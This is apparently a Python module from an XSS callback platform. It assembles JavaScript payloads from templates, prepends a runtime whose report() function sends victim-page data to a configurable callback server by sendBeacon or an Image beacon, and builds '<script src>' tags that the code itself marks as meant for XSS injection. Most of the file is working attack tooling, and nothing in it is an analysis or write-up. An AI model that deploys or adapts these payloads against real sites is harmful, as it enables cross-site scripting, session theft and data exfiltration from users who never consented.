"""JS payload 构建器 — 模块 body + 参数 → 最终可执行 JS。

渲染规则:
- {{param}}           → 模块参数(html 转义,防引号破坏脚本)
- {{config.xxx}}      → 配置字段注入
- {{host}}            → 反连服务器对外地址(默认 127.0.0.1,可被参数 host 覆盖)
- 未知占位符           → 替换为空(与 flowscan config.render_template 同款正则)

每个 payload 顶部注入公共运行时:
- SERVER  反连根地址
- report(data)  Image beacon 跨域回传(无需 CORS,GET 型 kb 级以内)
- _q(name, def)    参数读取助手(URL query 覆盖模块默认值)
"""

import json
import re
from typing import Any, Dict, Optional

_HTML_ESCAPE = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
}
_ESCAPE_RE = re.compile(r"[&<>\"']")


def _html_escape(s: str) -> str:
    return _ESCAPE_RE.sub(lambda m: _HTML_ESCAPE[m.group(0)], str(s))


_PLACEHOLDER_RE = re.compile(r"\{\{\s*([^{}]+?)\s*\}\}")


def _render(template: str, context: Dict[str, Any], config: Any) -> str:
    """{{expr}} 占位符替换。expr = 参数名 | config.字段 | host。"""
    if not template:
        return ""

    def replace(match: re.Match) -> str:
        expr = match.group(1).strip()
        if expr == "host":
            return _html_escape(str(context.get("host", "127.0.0.1")))
        if expr.startswith("config."):
            key = expr[len("config."):]
            return _html_escape(str(getattr(config, key, "")))
        return _html_escape(str(context.get(expr, "")))

    return _PLACEHOLDER_RE.sub(replace, template)


# 公共运行时前缀(注入到每个 payload 顶部)
_RUNTIME_PREFIX = r"""/* ==== runtime ==== */
var SERVER = "http://{{host}}:{{config.port}}";
function _q(name, dflt) {
  try {
    var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
    return m ? decodeURIComponent(m[1].replace(/\+/g, ' ')) : (dflt == null ? '' : dflt);
  } catch (e) { return dflt == null ? '' : dflt; }
}
function report(d) {
  try {
    var payload = JSON.stringify(d);
    if (navigator.sendBeacon) {
      // 主路径:POST 发送(keepalive,页面卸载也能发出;数据在 body 不在 URL,
      // 无 2-8KB URL 长度限制,Referer 也不携带回传内容)
      navigator.sendBeacon(SERVER + "{{config.route_report}}", payload);
    } else {
      // 老浏览器回退:Image beacon GET,截断到 URL 安全长度防丢失
      var body = encodeURIComponent(payload.slice(0, 1800));
      new Image().src = SERVER + "{{config.route_report}}?d=" + body;
    }
  } catch (e) {}
}
/* ==== end runtime ==== */
"""


class PayloadBuilder:
    """模块 → JS payload。"""

    def __init__(self, loader, config):
        self._loader = loader
        self._config = config

    def build(self, name: str, params: Optional[Dict[str, Any]] = None,
              host: str = "") -> Dict[str, Any]:
        """构建指定模块的最终 JS 代码。

        params: 模块参数 dict(可选,缺省用模块声明参数的默认提示值)
        host:   反连地址覆盖(缺省 127.0.0.1)

        Returns: {"ok": True, "code": str} 或 {"ok": False, "error": str}
        """
        mod = self._loader.get_module(name)
        if not mod:
            return {"ok": False, "error": f"模块 {name} 不存在"}
        declared = [p[0] for p in mod.get("params", [])]
        unknown = set(params or {}) - set(declared)
        if unknown:
            return {"ok": False, "error": f"未知参数: {sorted(unknown)}"}
        context = {"host": host or "127.0.0.1"}
        for pname in declared:
            if params and pname in params and params[pname] is not None:
                context[pname] = str(params[pname])
            else:
                # 缺省值取参数 hint 中 "默认 X" 的 X;无则空串
                hint = ""
                for dp in mod.get("params", []):
                    if dp[0] == pname and len(dp) > 1:
                        hint = dp[1]
                        break
                m = re.search(r"默认\s*([^\s,;]+)", str(hint))
                context[pname] = m.group(1) if m else ""
        runtime = _render(_RUNTIME_PREFIX, context, self._config)
        body = _render(mod.get("body", ""), context, self._config)
        code = runtime + "\n" + body + "\n"
        if len(code.encode("utf-8")) > self._config.max_payload_bytes:
            return {"ok": False,
                    "error": f"payload {len(code)} 字节超过上限 "
                             f"{self._config.max_payload_bytes}"}
        return {"ok": True, "code": code, "module": name}

    def build_script_tag(self, name: str, params: Optional[Dict[str, Any]] = None,
                         host: str = "") -> Dict[str, Any]:
        """生成 XSS 注入用 <script src> 标签。

        Returns: {"ok": True, "tag": str, "url": str} 或 {"ok": False, ...}
        """
        mod = self._loader.get_module(name)
        if not mod:
            return {"ok": False, "error": f"模块 {name} 不存在"}
        parts = [f"m={name}"]
        if params:
            for k, v in params.items():
                if v not in (None, ""):
                    parts.append(f"{k}={_urlencode(str(v))}")
        qs = "?" + "&".join(parts)
        url = (f"http://{host or '127.0.0.1'}:{self._config.port}"
               f"{self._config.route_payload}{qs}")
        tag = f'<script src="{url}"></script>'
        return {"ok": True, "tag": tag, "url": url}


def _urlencode(s: str) -> str:
    import urllib.parse
    return urllib.parse.quote(s, safe="")
